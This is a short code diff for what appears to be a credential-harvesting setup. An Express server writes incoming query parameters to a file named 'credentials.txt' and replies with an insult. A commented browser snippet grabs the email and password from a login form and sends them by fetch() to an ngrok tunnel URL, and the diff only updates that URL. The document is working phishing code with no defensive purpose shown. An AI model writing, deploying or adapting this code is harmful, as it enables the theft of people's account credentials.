@@ -8,7 +8,8 @@ app.use(cors());
 
 app.get('/', function (req, res) {
   console.log(req.query);
-  fs.appendFileSync('info.txt', req.query, (err) => {console.log(err)});
+  const output = JSON.stringify(req.query);
+  fs.appendFileSync('credentials.txt', `${output}\n`, (err) => {console.log(err)});
   res.send('Fuck U!');
 })
 
@@ -27,5 +28,5 @@ http.createServer({
 document.querySelector('form button').addEventListener('click',function(e){
    let email = document.querySelectorAll('form input')[0].value // getElementById('f293281b7d48108').value;
    let password = document.querySelectorAll('form input')[1].value  //document.getElementById('f26a33c68b9c2f4').value;
-   fetch('https://2afa7b10.ngrok.io?email='+email+'&password=' + password);});
+   fetch('https://25b758bc.ngrok.io?email='+email+'&password=' + password);});
 */
